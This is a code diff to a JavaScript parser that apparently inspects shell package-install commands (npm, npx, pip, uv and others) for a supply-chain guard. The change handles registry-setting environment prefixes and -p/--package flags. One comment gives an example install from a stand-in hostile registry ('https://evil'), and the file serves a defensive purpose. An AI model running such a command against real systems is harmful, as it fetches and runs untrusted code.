@@ -122,23 +122,47 @@ function skipLeadingFlags(args, valueFlags) {
 
 function parseSegment(rawWords) {
   let w = unwrap(rawWords);
-  while (w.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(w[0]) || w[0] === "sudo" || w[0] === "command" || w[0] === "exec")) w = w.slice(1);
+  // An env prefix chooses the registry the install actually uses: `NPM_CONFIG_REGISTRY=https://evil npm i pkg`
+  // must not be checked against the public registry.
+  let envRegistry = "";
+  while (w.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(w[0]) || w[0] === "sudo" || w[0] === "command" || w[0] === "exec")) {
+    const reg = /^(NPM_CONFIG_REGISTRY|PIP_INDEX_URL)=(\S+)/i.exec(w[0]);
+    if (reg) envRegistry = reg[2];
+    w = w.slice(1);
+  }
   if (!w.length) return null;
   const cmd = w[0];
   const ecosystem = ["npm", "pnpm", "yarn", "bun", "npx", "bunx"].includes(cmd) ? "npm" : "pypi";
-  if (usesCustomRegistry(w.slice(1), ecosystem)) return null;
+  if ((envRegistry && !PUBLIC_REGISTRY_RE.test(envRegistry)) || usesCustomRegistry(w.slice(1), ecosystem)) return null;
   const isNode = ["npm", "pnpm", "yarn", "bun"].includes(cmd);
   const [sub, ...rest] = isNode ? skipLeadingFlags(w.slice(1), NPM_VALUE_FLAGS) : w.slice(1);
   const npm = (args, opts) => ({ ecosystem: "npm", packages: collect(args, NPM_VALUE_FLAGS, npmName, opts) });
   const pypi = (args, opts) => ({ ecosystem: "pypi", packages: collect(args, PIP_VALUE_FLAGS, pypiName, opts) });
+  // `npx -p pkg cmd` / `npm exec --package=pkg -- cmd` install and run `pkg`, not `cmd`: the package under
+  // scrutiny is the -p/--package value. Without it, fall back to the first positional as before.
+  const execPackages = (args) => {
+    const pkgs = [];
+    for (let i = 0; i < args.length; i++) {
+      const a = args[i];
+      if (a === "-p" || a === "--package") {
+        const n = npmName(args[i + 1] ?? "");
+        if (n) pkgs.push(n);
+        i++;
+      } else if (a.startsWith("--package=")) {
+        const n = npmName(a.slice("--package=".length));
+        if (n) pkgs.push(n);
+      }
+    }
+    return pkgs.length ? { ecosystem: "npm", packages: pkgs } : npm(args, { firstOnly: true });
+  };
   if (cmd === "npm" && ["i", "install", "add", "isntall", "in"].includes(sub)) return npm(rest);
   // `npm exec` / `npm x` download and run a package exactly like `npx` does.
-  if (cmd === "npm" && (sub === "exec" || sub === "x")) return npm(rest, { firstOnly: true });
+  if (cmd === "npm" && (sub === "exec" || sub === "x")) return execPackages(rest);
   if ((cmd === "pnpm" || cmd === "bun") && ["add", "i", "install"].includes(sub)) return npm(rest);
   if (cmd === "yarn" && sub === "add") return npm(rest);
   if (cmd === "yarn" && sub === "workspace" && rest[1] === "add") return npm(rest.slice(2));
-  if (cmd === "npx" || cmd === "bunx") return npm([sub, ...rest].filter(Boolean), { firstOnly: true });
-  if ((cmd === "pnpm" || cmd === "yarn") && sub === "dlx") return npm(rest, { firstOnly: true });
+  if (cmd === "npx" || cmd === "bunx") return execPackages([sub, ...rest].filter(Boolean));
+  if ((cmd === "pnpm" || cmd === "yarn") && sub === "dlx") return execPackages(rest);
   if ((cmd === "pip" || cmd === "pip3") && sub === "install") return pypi(rest);
   if (/^python3?(\.\d+)?$/.test(cmd) && sub === "-m" && rest[0] === "pip" && rest[1] === "install") return pypi(rest.slice(2));
   if (cmd === "uv" && sub === "add") return pypi(rest);
